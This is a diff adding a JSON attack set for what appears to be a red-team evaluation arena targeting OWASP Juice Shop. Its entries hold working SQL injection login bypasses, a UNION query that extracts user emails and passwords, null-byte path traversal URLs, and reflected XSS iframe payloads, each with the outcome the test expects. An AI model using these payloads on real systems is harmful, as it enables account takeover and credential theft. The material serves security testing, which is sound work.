@@ -1,0 +1,65 @@
+{
+  "_comment": "Scripted Red attack set for Stage 2. Payloads live in DATA, not code. Each entry is a genuine attack of its stated CWE (contract 0, 'Red labels must be truthful'). Verified empirically against OWASP Juice Shop v20.3.0 through the arena proxy; do not trust writeups. expected_landed / expected_reason are the Judge fact-1 outcomes the end-to-end check asserts. Order matters: snapshots are NOT reset between attacks, so a mapped challenge solved by an earlier round makes a later same-target attack 'already_solved'.",
+  "attacks": [
+    {
+      "label": "CWE-89",
+      "note": "Negative control: a GENUINE SQLi attempt that fails to land. The tautology is in the password field with a normal email; Juice Shop hashes the password before building the query, so the injection is neutralized and login fails (401). Still a real CWE-89 attack, not benign traffic.",
+      "method": "POST",
+      "endpoint": "/rest/user/login",
+      "json_body": { "email": "admin@juice-sh.op", "password": "' OR 1=1--" },
+      "expected_landed": false,
+      "expected_reason": null
+    },
+    {
+      "label": "CWE-89",
+      "note": "Login Admin: SQLi tautology in the email field comments out the password check, authenticating as the first user (admin).",
+      "method": "POST",
+      "endpoint": "/rest/user/login",
+      "json_body": { "email": "' OR 1=1--", "password": "x" },
+      "expected_landed": true,
+      "expected_reason": null
+    },
+    {
+      "label": "CWE-89",
+      "note": "User Credentials: UNION-based injection in the product-search 'q' parameter exfiltrates email+password columns (10-column UNION matches the Products table in v20.3.0).",
+      "method": "GET",
+      "endpoint": "/rest/products/search",
+      "query_params": { "q": "x')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9', '10' FROM Users--" },
+      "expected_landed": true,
+      "expected_reason": null
+    },
+    {
+      "label": "CWE-22",
+      "note": "Poison Null Byte: a null byte (%2500) after a .bak path bypasses the .md suffix check and reads the developer backup inside /ftp. Solves Poison Null Byte and Forgotten Developer Backup in one request.",
+      "method": "GET",
+      "endpoint": "/ftp/package.json.bak%2500.md",
+      "expected_landed": true,
+      "expected_reason": null
+    },
+    {
+      "label": "CWE-22",
+      "note": "Second null-byte traversal, a different in-root backup file. On a fresh target it solves Poison Null Byte; here it runs AFTER the attack above, so every mapped CWE-22 challenge is already solved and this round cannot be credited with landing.",
+      "method": "GET",
+      "endpoint": "/ftp/coupons_2013.md.bak%2500.md",
+      "expected_landed": null,
+      "expected_reason": "already_solved"
+    },
+    {
+      "label": "CWE-79",
+      "note": "Reflected XSS attempt: iframe/javascript payload in the order-tracking path. The endpoint is percent-encoded because it IS the exact request-line target (sent verbatim, like the %2500 paths); the decoded value is <iframe src=\"javascript:alert(`xss`)\">. CWE-79 landing is not measurable in the Docker deployment (contract 11), so landed is null regardless of server behavior.",
+      "method": "GET",
+      "endpoint": "/rest/track-order/%3Ciframe%20src%3D%22javascript%3Aalert%28%60xss%60%29%22%3E",
+      "expected_landed": null,
+      "expected_reason": "not_measurable"
+    },
+    {
+      "label": "CWE-79",
+      "note": "Reflected XSS attempt in the product-search parameter. Also not measurable (contract 11); the map for CWE-79 is empty so landed is null.",
+      "method": "GET",
+      "endpoint": "/rest/products/search",
+      "query_params": { "q": "<iframe src=\"javascript:alert(`xss`)\">" },
+      "expected_landed": null,
+      "expected_reason": "not_measurable"
+    }
+  ]
+}
